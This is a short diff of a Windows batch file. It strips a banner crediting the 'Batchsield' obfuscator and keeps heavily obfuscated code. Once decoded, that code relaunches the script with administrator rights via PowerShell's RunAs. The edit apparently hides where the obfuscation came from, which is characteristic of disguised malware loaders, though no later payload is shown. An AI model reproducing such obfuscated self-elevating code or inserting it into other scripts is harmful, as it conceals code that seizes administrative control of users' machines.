@@ -1,17 +1,3 @@
-:: ▄▄▄▄    ▄▄▄     ▄▄▄█████▓ ▄████▄   ██░ ██   ██████  ██░ ██  ██▓▓█████  ██▓    ▓█████▄ 
-:: ▓█████▄ ▒████▄   ▓  ██▒ ▓▒▒██▀ ▀█  ▓██░ ██▒▒██    ▒ ▓██░ ██▒▓██▒▓█   ▀ ▓██▒    ▒██▀ ██▌
-:: ▒██▒ ▄██▒██  ▀█▄ ▒ ▓██░ ▒░▒▓█    ▄ ▒██▀▀██░░ ▓██▄   ▒██▀▀██░▒██▒▒███   ▒██░    ░██   █▌
-:: ▒██░█▀  ░██▄▄▄▄██░ ▓██▓ ░ ▒▓▓▄ ▄██▒░▓█ ░██   ▒   ██▒░▓█ ░██ ░██░▒▓█  ▄ ▒██░    ░▓█▄   ▌
-:: ░▓█  ▀█▓ ▓█   ▓██▒ ▒██▒ ░ ▒ ▓███▀ ░░▓█▒░██▓▒██████▒▒░▓█▒░██▓░██░░▒████▒░██████▒░▒████▓ 
-:: ░▒▓███▀▒ ▒▒   ▓▒█░ ▒ ░░   ░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░▓  ░░ ▒░ ░░ ▒░▓  ░ ▒▒▓  ▒ 
-:: ▒░▒   ░   ▒   ▒▒ ░   ░      ░  ▒    ▒ ░▒░ ░░ ░▒  ░ ░ ▒ ░▒░ ░ ▒ ░ ░ ░  ░░ ░ ▒  ░ ░ ▒  ▒ 
-::  ░    ░   ░   ▒    ░      ░         ░  ░░ ░░  ░  ░   ░  ░░ ░ ▒ ░   ░     ░ ░    ░ ░  ░ 
-::  ░            ░  ░        ░ ░       ░  ░  ░      ░   ░  ░  ░ ░     ░  ░    ░  ░   ░    
-::       ░                   ░                                                     ░            
-::
-::                          !! Obfuscated By Batchsield !!
-
-
 @%PZt%e%DZwhTfQkv%c%W%h%djupuctRjT%o%wzxyBUBB% %Yj%o%ivZM%f%sgQJwTtu%f%rkhMAdWD%
 i%TLEjaZwhE%f%caY% %bxFTkhtBS%n%yJ%o%ccjdqqzT%t%sz% %tRI%"%Qr%%1"=="am_admin" (
     powershell -Command "Start-Process -Verb RunAs -FilePath '%0%VgEA%'%HnSvoES% %MyQHVAj%-%Pb%A%Y%r%HjbmH%g%KB%u%LdjmCqKT%m%veLrVi%e%doOCnN%n%io%t%cJbcifZs%L%YIvQDFHU%i%vfde%s%jIfNqTFH%t%gPFOFm% %Vm%"%WIJAT%a%YEjmWYsq%m%fHPjyGFNy%_%hzgu%a%OTCzBx%d%SuMXp%m%A%i%birB%n%a%"%ZobQLIA%
